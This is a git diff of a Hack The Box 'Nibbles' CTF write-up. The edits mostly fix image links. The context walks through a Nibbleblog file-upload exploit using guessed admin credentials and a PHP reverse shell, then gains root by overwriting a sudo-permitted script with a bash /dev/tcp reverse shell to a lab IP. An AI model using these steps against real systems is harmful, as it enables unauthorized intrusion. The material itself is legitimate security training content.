@@ -1,6 +1,6 @@
 ---
 title: HTB - Nibbles writeup
-date: 2025-08-21 08:00:00 +0000
+date: 2025-08-21 12:00:00 +0000
 categories:
   - CTF
   - HTB
@@ -49,18 +49,18 @@ Accessing this directory shows us a blog:
 ![Blog Page](/assets/images/nibbles/blog_page.png)
 
 Next, I did some directory enumeration to see if there were any hidden files or directories. Using the `common.txt` wordlist, I got:  
-![[dir_enum.png]]  
-![[dir_enum_result.png]]
+![Dir Enum](/assets/images/nibbles/dir_enum.png)   
+![Dir Enum Result](/assets/images/nibbles/dir_enum_result.png)
 
 There are some interesting results. The first thing I checked was the `README` file:  
-![[readme.png]]
+![Readme](/assets/images/nibbles/readme.png)
 
 It shows `Nibbleblog v4.0.3`.
 
 Searching online, I found that it’s a CMS vulnerable to **Arbitrary File Upload**. To exploit this, we need credentials for the admin page.
 
 After some enumeration, I discovered the username `admin`.  
-![[username.png]]
+![Username](/assets/images/nibbles/username.png)
 
 I couldn’t find the password at first, but after a few guesses, I ended up with:
 
@@ -69,18 +69,18 @@ admin:nibbles
 ```
 
 Now with credentials, I went to GitHub to check how to get RCE. From the code, I learned I need to upload a PHP reverse shell in `/content/private/plugins/my_image/`.  
-![[github.png]]
+![GitHub](/assets/images/nibbles/github.png)
 
 So I went to the admin dashboard → Plugins → My Image → uploaded my reverse shell.  
-![[reverse_shell.png]]  
-![[uploaded_image.png]]
+![Reverse Shell Upload](/assets/images/nibbles/reverse_shell.png)  
+![Uploaded Image](/assets/images/nibbles/uploaded_image.png)
 
 ---
 
 ## Getting a Shell
 
 Then I set up a Netcat listener:  
-![[get_shell.png]]
+![Get Shell](/assets/images/nibbles/get_shell.png)
 
 Got the shell! I upgraded it with:
 
@@ -88,10 +88,10 @@ Got the shell! I upgraded it with:
 script /dev/null -c bash
 ```
 
-![[shell_upgrade.png]]
+![Shell Upgrade](/assets/images/nibbles/shell_upgrade.png)
 
 We are now the user `nibbler`. In the home directory, I grabbed the first flag:  
-![[first_flag.png]]
+![First Flag](/assets/images/nibbles/first_flag.png)
 
 ---
 
@@ -103,10 +103,10 @@ I ran:
 sudo -l
 ```
 
-![[sudo-l.png]]
+![sudo](/assets/images/nibbles/sudo-l.png)
 
 It showed that we can run the `monitor.sh` script as root. After unzipping the `personal.zip` file, I got the script.  
-![[the zip fie.png]]
+![Unzip The File](/assets/images/nibbles/'the zip fie.png')
 
 Checking the file, I noticed I had write permission. So I overwrote it with a reverse shell:
 
@@ -114,10 +114,10 @@ Checking the file, I noticed I had write permission. So I overwrote it with a re
 echo "bash -c 'bash -i >& /dev/tcp/10.10.14.29/6666 0>&1'" > monitor.sh
 ```
 
-![[overrideFile.png]]
+![overwrote](/assets/images/nibbles/overrideFile.png)
 
 Then I started another Netcat listener:  
-![[root_reverse_shell.png]]
+![root reverse shell](/assets/images/nibbles/root_reverse_shell.png)
 
 Finally, I ran the script as root:
 
@@ -125,13 +125,13 @@ Finally, I ran the script as root:
 sudo ./monitor.sh
 ```
 
-![[run the reverse shell.png]]
+![run the reverse shell](/assets/images/nibbles/'run the reverse shell.png')
 
 And we got a **root shell**!  
-![[get_root_shell.png]]
+![get the root shell](/assets/images/nibbles/get_root_shell.png)
 
 Grabbed the root flag:  
-![[root_flag.png]]
+![root flag](/assets/images/nibbles/root_flag.png)
 
 ---
 
